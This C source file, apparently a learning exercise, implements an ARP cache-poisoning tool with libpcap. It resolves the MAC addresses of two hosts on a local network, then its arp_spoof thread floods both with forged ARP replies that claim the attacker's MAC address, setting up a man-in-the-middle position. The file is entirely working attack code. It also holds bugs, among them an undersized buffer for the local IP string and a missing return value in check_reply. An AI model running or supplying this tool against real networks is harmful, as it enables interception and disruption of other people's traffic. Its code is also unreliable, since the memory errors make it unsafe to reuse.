#include <pcap.h>
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <ctype.h>
#include <errno.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <sys/ioctl.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <ifaddrs.h>
#include <netdb.h>
#include <net/if.h>
#include <pthread.h>

#define SNAP_LEN 1518

#pragma pack(push, 1)
struct sniff_arp {
        u_int8_t  ether_dhost[6];    /* destination host address */
        u_int8_t  ether_shost[6];    /* source host address */
        u_int16_t ether_type;        /* IP? ARP? RARP? etc */

        u_int16_t arp_htype; /*hardware type*/
        u_int16_t arp_p; /*protocol*/
        u_int8_t arp_hsize; /*hardware size*/
        u_int8_t arp_psize; /*protocol size*/
        u_int16_t arp_opcode; /*opcode*/
        u_int8_t arp_smhost[6]; /*sender mac address*/
        struct in_addr arp_sender_ip; /*sender ip address*/
        u_int8_t arp_dmhost[6]; /*target mac address*/
        struct in_addr arp_target_ip; /*target ip address*/
};
struct data {
	u_char *dev;
	u_char *sender_ip;
	u_char sender_mac[6];
	u_char *target_ip;
	u_char target_mac[6];
	
	u_char my_mac[6];
};
#pragma pack(pop)

int s_getIpAddress (const char * ifr, unsigned char * out);
char *getMAC(const char *ip);
void create_arp_request(struct sniff_arp * arp_packet, char *dev, u_char *target_ip, u_char *my_mac, u_char *my_ip);
void create_arp_reply(struct sniff_arp * arp_packet, char *dev, u_char *sender_ip, u_char *target_ip, u_char *target_mac, u_char *my_mac);
void get_target_mac(struct sniff_arp * arp_packet, char *dev, u_char *target_ip, u_char *target_mac, u_char *my_mac, u_char *my_ip);
int check_reply (const u_char *packet, u_char *target_ip, u_char *target_mac);
void show_data (const u_char * packet);

void *arp_spoof(void *);

int main(int argc, char *argv[]) {
	struct sniff_arp * arp_packet =  malloc(sizeof(struct sniff_arp));
	struct data list;
	u_char *dev = NULL;
	u_char *sender_ip = NULL;
	u_char sender_mac[6] = {0};
	u_char *target_ip = NULL;
	u_char target_mac[6] = {0};

	char *my_ip = (char*)calloc(sizeof(char), 4);
	u_char *my_mac = NULL;
	u_char ip_tmp[4];
	int i;

	pthread_t thread1;
	pthread_t thread2;

	if (argc == 4) {
		dev = argv[1];
		sender_ip = argv[2];
		target_ip = argv[3];
	} else {
		fprintf(stderr, "error: do not matched argument\n");
	}

        if (s_getIpAddress(dev, ip_tmp) > 0 )
		sprintf(my_ip, "%d.%d.%d.%d", ip_tmp[0], ip_tmp[1], ip_tmp[2], ip_tmp[3]);
	my_mac = getMAC(my_ip);

	printf("my_ip : %s\n", my_ip);
	printf("my_mac : %02x:%02x:%02x:%02x:%02x:%02x\n", my_mac[0], my_mac[1], my_mac[2], my_mac[3], my_mac[4], my_mac[5]);

	get_target_mac(arp_packet, dev, sender_ip, sender_mac, my_mac, my_ip);

	printf("sender_mac : %02x:%02x:%02x:%02x:%02x:%02x\n", sender_mac[0], sender_mac[1], sender_mac[2], sender_mac[3], sender_mac[4], sender_mac[5]);

	get_target_mac(arp_packet, dev, target_ip, target_mac, my_mac, my_ip);

	printf("target_mac : %02x:%02x:%02x:%02x:%02x:%02x\n", target_mac[0], target_mac[1], target_mac[2], target_mac[3], target_mac[4], target_mac[5]);

	list.dev = dev;
	list.sender_ip = sender_ip;
	list.target_ip = target_ip;

	for (i=0; i<6; i++) {
		list.sender_mac[i] = sender_mac[i];
		list.target_mac[i] = target_mac[i];
		list.my_mac[i] = my_mac[i];
	}

	pthread_create(&thread1, NULL, arp_spoof, (void *)&list);
	pthread_join(thread1, NULL);

}

void show_data (const u_char * packet) {
        int i, tmp=0;

        printf("Data Code : \n ");
        for (i=0; i<42; i++) {
                printf("%.2x ", *(packet+i)&0xff);
                tmp++;

                if (tmp%16 == 0)
                        printf("\n");
                if (tmp%8 == 0)
                        printf(" ");
        }

        printf("\n");

}

void *arp_spoof(void *args) {
	struct sniff_arp * sender_arp =  malloc(sizeof(struct sniff_arp));
	struct sniff_arp * target_arp =  malloc(sizeof(struct sniff_arp));
	struct data *list = (struct data *)args;

	pcap_t *handle;
	char errbuf[PCAP_ERRBUF_SIZE];
        struct pcap_pkthdr *header;
	const u_char *common_packet;
	int i;

	u_char sender_packet[42];
	u_char target_packet[42];

	handle = pcap_open_live (list->dev, SNAP_LEN, 1, 1000, errbuf);

	create_arp_reply(sender_arp, list->dev, list->target_ip, list->sender_ip, list->sender_mac, list->my_mac);
	create_arp_reply(target_arp, list->dev, list->sender_ip, list->target_ip, list->target_mac, list->my_mac);
	memcpy(sender_packet, sender_arp, 42);
	memcpy(target_packet, target_arp, 42);
	
	while (1) {
                if (pcap_sendpacket(handle, sender_packet, 42) != 0) {
                        fprintf(stderr,"\nError sending the packet: \n", pcap_geterr(handle));
                        return;
                }

                if (pcap_sendpacket(handle, target_packet, 42) != 0) {
                        fprintf(stderr,"\nError sending the packet: \n", pcap_geterr(handle));
                        return;
                }

	}

}

void get_target_mac(struct sniff_arp * arp_packet, char *dev, u_char *target_ip, u_char *target_mac, u_char *my_mac, u_char *my_ip) {
	pcap_t *handle;
	char errbuf[PCAP_ERRBUF_SIZE];
        struct pcap_pkthdr *header;
	const u_char *common_packet;
	int i;

	u_char packet[42];

	handle = pcap_open_live (dev, SNAP_LEN, 1, 1000, errbuf);
        if (handle == NULL) {
                fprintf(stderr, "Couldn't open device %s: %s\n", dev, errbuf);
                exit(EXIT_FAILURE);
        }
	create_arp_request(arp_packet, dev, target_ip, my_mac, my_ip);
	memcpy(packet, arp_packet, 42);

        for (i=1; i<10; i++) {
                if (pcap_sendpacket(handle, packet, 42) != 0) {
                        fprintf(stderr,"\nError sending the packet: \n", pcap_geterr(handle));
                        return;
                }

                if (pcap_next_ex(handle, &header, &common_packet) > 0) {
                        if (check_reply(common_packet, target_ip, target_mac) == 4)
                                break;
                }
		
                if (i == 9) {
			printf("MAC is not found\n");
                        exit(EXIT_FAILURE);
		}
        }

}

void create_arp_request(struct sniff_arp * arp_packet, char *dev, u_char *target_ip, u_char *my_mac, u_char *my_ip) {
	int i;
	
	for (i=0; i<6; i++) {
		arp_packet->ether_dhost[i] = 0xff;
		arp_packet->ether_shost[i] = my_mac[i];
		arp_packet->arp_smhost[i] = my_mac[i];
		arp_packet->arp_dmhost[i] = 0x00;
	}

        arp_packet->ether_type = htons(0x0806);
        arp_packet->arp_htype = htons(0x0001);
        arp_packet->arp_p = htons(0x0800);

        arp_packet->arp_hsize = 0x6;
        arp_packet->arp_psize = 0x4;
        arp_packet->arp_opcode= htons(0x0001);

        inet_pton(AF_INET, my_ip, &(arp_packet->arp_sender_ip));
        inet_pton(AF_INET, target_ip, &(arp_packet->arp_target_ip));

}

void create_arp_reply(struct sniff_arp * arp_packet, char *dev, u_char *sender_ip, u_char *target_ip, u_char *target_mac, u_char *my_mac) {
	int i;
	
	for (i=0; i<6; i++) {
		arp_packet->ether_dhost[i] = target_mac[i];
		arp_packet->ether_shost[i] = my_mac[i];
		arp_packet->arp_smhost[i] = my_mac[i];
		arp_packet->arp_dmhost[i] = target_mac[i];
	}

        arp_packet->ether_type = htons(0x0806);
        arp_packet->arp_htype = htons(0x0001);
        arp_packet->arp_p = htons(0x0800);

        arp_packet->arp_hsize = 0x6;
        arp_packet->arp_psize = 0x4;
        arp_packet->arp_opcode= htons(0x0002);

        inet_pton(AF_INET, sender_ip, &(arp_packet->arp_sender_ip));
        inet_pton(AF_INET, target_ip, &(arp_packet->arp_target_ip));

	show_data(arp_packet);

}

int check_reply (const u_char *packet, u_char *target_ip, u_char *target_mac) {
        const struct sniff_arp * arp_reply;
        u_char reply_ip[100];

        arp_reply = (struct sniff_arp *)(packet);
        inet_ntop(AF_INET, &(arp_reply->arp_sender_ip), reply_ip, 100);

        if (arp_reply->ether_type == htons(0x0806)) {
		if (!strcmp(target_ip, reply_ip)) {
		        if (arp_reply->arp_opcode == htons(0x0002)) {
		                memcpy(target_mac, arp_reply->arp_smhost, 6);
		                return 4;
		        }
		}
        }
}     

int s_getIpAddress (const char * ifr, unsigned char * out) {  
        int sockfd;  
        struct ifreq ifrq;  
        struct sockaddr_in * sin;  
        sockfd = socket(AF_INET, SOCK_DGRAM, 0);  
        strcpy(ifrq.ifr_name, ifr);  

        if (ioctl(sockfd, SIOCGIFADDR, &ifrq) < 0) {  
                perror( "ioctl() SIOCGIFADDR error");  
                return -1;  
        }  
        sin = (struct sockaddr_in *)&ifrq.ifr_addr;  
        memcpy (out, (void*)&sin->sin_addr, sizeof(sin->sin_addr));  

        close(sockfd);  

        return 4;  
}

char *getMAC(const char *ip){
        struct ifaddrs *ifaddr, *ifa;
        int family, s, i;
        char host[NI_MAXHOST];
        struct sockaddr *sdl;
        unsigned char *ptr;
        char *ifa_name;
        char *mac_addr = (char*)calloc(sizeof(char), 6);

        if (getifaddrs(&ifaddr) == -1) {
                perror("getifaddrs");
                return NULL;
        }

        //iterate to find interface name for given server_ip
        for (ifa = ifaddr; ifa != NULL; ifa = ifa->ifa_next) {
                if (ifa->ifa_addr != NULL) {
                        family = ifa->ifa_addr->sa_family;
                        if(family == AF_INET) {
                                s = getnameinfo(ifa->ifa_addr, (family == AF_INET)?sizeof(struct sockaddr_in):sizeof(struct sockaddr_in6),
                                host, NI_MAXHOST, NULL, 0, NI_NUMERICHOST);
                                if (s != 0) {
                                        printf("getnameinfo() failed: %s\n", gai_strerror(s));
                                        return NULL;
                                }
                                if(strcmp(host, ip) == 0){
                                        ifa_name = ifa->ifa_name;
                                }
                        }
                }
        }

        //iterate to find corresponding ethernet address
        for (ifa = ifaddr; ifa != NULL; ifa = ifa->ifa_next) {
                family = ifa->ifa_addr->sa_family;
                if(family == PF_PACKET && strcmp(ifa_name, ifa->ifa_name) == 0) {
                        sdl = (struct sockaddr *)(ifa->ifa_addr);
                        ptr = (unsigned char *)sdl->sa_data;
                        ptr += 10;
			for (i=0; i<6; i++)
				mac_addr[i] = *(ptr+i);
			//sprintf(mac_addr, "%02x:%02x:%02x:%02x:%02x:%02x", *ptr, *(ptr+1), *(ptr+2), *(ptr+3), *(ptr+4), *(ptr+5));
                        break;
                }
        }
        freeifaddrs(ifaddr);
	return mac_addr;
} 
